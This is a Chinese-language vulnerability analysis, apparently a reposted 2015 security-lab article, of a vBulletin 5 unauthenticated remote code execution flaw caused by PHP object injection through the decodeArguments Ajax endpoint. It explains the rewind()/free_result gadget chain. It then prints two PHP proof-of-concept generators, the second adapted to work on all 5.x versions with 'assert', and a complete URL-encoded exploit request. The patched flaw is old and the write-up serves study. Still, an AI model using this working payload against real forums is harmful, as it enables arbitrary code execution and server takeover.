# vBulletin 5 全版本远程代码执行漏洞分析

阅读量 **205189**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-11-06 16:13:06

 **x**

##### 译文声明

本文是翻译文章，文章来源：SudoHac@360adlab

译文仅供参考，具体内容表达以及含义原文为准。

**  
**

**[Author：SudoHac（360adlab）](http://weibo.com/sudosec)**

前几天vBulletin官方论坛被黑,随后一个叫Coldzer0的小哥在1337上卖vBulletin 5全版本的RCE
0day,看演示很厉害,指哪打哪。不过不幸的是不久后就有人在pastie上贴出了完整分析和POC。

目前vBulletin官方已经发布安全公告修复了该漏洞。

[http://www.vbulletin.org/forum/showthread.php?p=2558144](http://www.vbulletin.org/forum/showthread.php?p=2558144)

**漏洞分析**

在vBulletin中存在很多内部的接口,有一些可以在外部通过Ajax调用,这次的问题出现vB_Api_Hook::decodeArguments()中。

这个接口可以在未登录的情况下直接访问,

参数传入后直接被unserialize反序列化。

然后被带入foreach进行迭代。

在/core/vb/db/result.php文件,vB_dB_Result类实现了Iterator接口,这个接口是php里的迭代器

php手册关于迭代器的介绍[http://php.net/manual/zh/class.iterator.php](http://php.net/manual/zh/class.iterator.php)

在php手册中可以看到,当程序通过foreach进行迭代时,rewind()方法会被第一个调用。

看下vB_dB_Result类中是如何实现rewind()的:

如果存在recordset,则将recordset带入free_result()函数

跟进free_result()函数:

可以看到程序将functions[‘free_resutl’]作为函数名,recordset作为参数执行了。

在类的开始有这样的定义,对应执行的是mysql_free_result()函数,也就是将recordset的内存释放掉。

这是程序正常的逻辑,但是如果我们在传入参数的时候,传入一个精心构造的对象,将functions[‘free_resutl’]定义为其他函数(比如eval、assert),然后将recordset定义为任意php代码,就可以实现RCE。

**漏洞利用**

作者直接给出了poc:

    
    
    $ php << 'eof'
     <?php
     class vB_Database {
            public $functions = array();
     
            public function __construct() 
            {
                    $this->functions['free_result'] = 'phpinfo';
            }
     }
     
     class vB_dB_Result {
            protected $db;
            protected $recordset;
     
            public function __construct()
            {
                    $this->db = new vB_Database();
                    $this->recordset = 1;
            }
     }
     
     print urlencode(serialize(new vB_dB_Result())) . "n";
     eof

运行后会生成一个序列化的对象,直接作为参数访问接口就可以了。

但是经过测试,发现这个poc只有在vBulletin<5.1的版本才可以成功,对比了下代码,发现其实有个小坑在里面。

在vBulletin<5.1中,vB_Database类是这样写的

但是在>5.1的版本中

这个类变成了一个抽象类,因此使用原文的poc去实例化一个抽象类肯定是会报错的。

我想这应该是作者故意留的一个小坑,来防止伸手党的吧 XD

那么我们要如何利用这个漏洞呢?

最简单的办法就是找一个继承了vB_Database类的子类,然后利用子类去访问父类的成员变量,修改为我们需要的assert。

经过搜索,发现使用vB_Database的一个子类vB_Database_MySQL可以实现利用。

改写下poc:

    
    
    $ php << 'eof'
     <?php
     class vB_Database_MySQL{
            public $functions = array();
     
            public function __construct() 
            {
                    $this->functions['free_result'] = 'assert';
            }
     }
     
     class vB_dB_Result {
            protected $db;
            protected $recordset;
     
            public function __construct()
            {
                    $this->db = new vB_Database_MySQL();
                    $this->recordset = "phpinfo()";
            }
     }
     
     print urlencode(serialize(new vB_dB_Result())) . "n";
     eof

即可通杀5全版本

    
    
    http://url /ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D

**后记**

通过分析,感觉这个漏洞最精彩的还是他的利用过程,作者通过foreach迭代中调用的rewind()方法实现对象注入,最终实现RCE,可见其漏洞挖掘功力之深厚。

同时值得一提的是这个对象注入其实还有更多可以利用的点,比如checkpoint发的这篇文章

[http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/](http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/)

利用vB_vURL的__destruct()实现任意文件删除,利用vB_View的__toString()实现远程代码执行。

**最后感谢不愿意透露姓名的L.N.和张老师在漏洞分析中给于的大力帮助 🙂**

本文翻译自SudoHac@360adlab [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360网络攻防实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82870](/post/id/82870)

安全客 - 有思想的安全新媒体

本文转载自: [SudoHac@360adlab]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg)
360网络攻防实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

